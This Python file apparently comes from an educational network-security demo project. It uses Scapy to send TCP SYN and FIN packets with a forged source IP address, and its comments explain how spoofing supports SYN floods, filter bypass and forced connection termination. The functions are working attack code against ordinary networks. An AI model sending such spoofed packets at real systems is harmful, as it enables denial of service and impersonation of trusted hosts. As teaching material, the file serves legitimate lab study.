# ============================================================
# FILE: spoofer/ip_spoofer.py
# PURPOSE: Creates and sends TCP packets with a FAKE source IP
# WHY NEEDED: This is the core demonstration of IP Spoofing —
#             one of the most fundamental network attack techniques.
#             By forging the source IP address, an attacker can:
#             1. Hide their real identity on the network
#             2. Impersonate trusted hosts
#             3. Bypass IP-based security filters
#             Separated from icmp_spoofer.py because TCP spoofing
#             and ICMP spoofing are different attack vectors with
#             different use cases and packet structures.
# ============================================================

from scapy.all import IP, TCP, send
# IP  → lets us build an IP layer and SET the source IP manually
# TCP → lets us build a TCP layer with custom ports and flags
# send() → transmits the crafted packet on the network (Layer 3)

from utils.helpers import log_packet, print_separator
# Shared utilities for consistent timestamped logging

def send_spoofed_syn(fake_src_ip, target_ip, target_port=80):
    # --------------------------------------------------------
    # SYN PACKET SPOOFING
    # A SYN packet is the FIRST step in TCP handshake
    # (SYN → SYN-ACK → ACK = connection established)
    # By sending a SYN with a fake source IP:
    # - Target thinks the connection is coming from fake_src_ip
    # - This is the basis of SYN Flood DDoS attacks
    # - Demonstrates IP identity forgery
    # --------------------------------------------------------
    
    print_separator()
    log_packet("Starting IP Spoofing Attack (SYN Packet)")
    print(f"  Fake Source IP : {fake_src_ip}")
    print(f"  Target IP      : {target_ip}")
    print(f"  Target Port    : {target_port}")
    print(f"  [!] Open Wireshark and filter: tcp.flags.syn==1")
    # Wireshark filter tip so team member can validate this packet

    packet = IP(src=fake_src_ip, dst=target_ip) / TCP(dport=target_port, flags="S")
    # IP(src=fake_src_ip) → THIS is the spoofing part
    #   We manually set source IP to any value we want
    #   Normally the OS sets this automatically to your real IP
    # IP(dst=target_ip)   → The real destination we are sending to
    # TCP(dport=port)     → Destination port on the target
    # TCP(flags="S")      → "S" = SYN flag, initiating connection
    # The "/" operator    → Stacks layers together (IP + TCP)

    send(packet, verbose=False)
    # send() transmits at Layer 3 (Network layer)
    # verbose=False suppresses Scapy's default output
    # since we have our own logging
    
    log_packet(f"Spoofed SYN packet sent to {target_ip}:{target_port}")

def send_spoofed_fin(fake_src_ip, target_ip, target_port=80):
    # --------------------------------------------------------
    # FIN PACKET SPOOFING
    # FIN flag = "I want to close this connection"
    # Sending spoofed FIN can forcefully terminate
    # someone else's active TCP connection
    # Demonstrates session hijacking concept
    # --------------------------------------------------------
    
    print_separator()
    log_packet("Starting IP Spoofing Attack (FIN Packet)")
    print(f"  [!] Wireshark filter: tcp.flags.fin==1")
    # Wireshark filter for team to validate

    packet = IP(src=fake_src_ip, dst=target_ip) / TCP(dport=target_port, flags="F")
    # flags="F" → FIN flag, signals connection termination
    # Everything else same as SYN but with different flag
    
    send(packet, verbose=False)
    log_packet(f"Spoofed FIN packet sent to {target_ip}:{target_port}")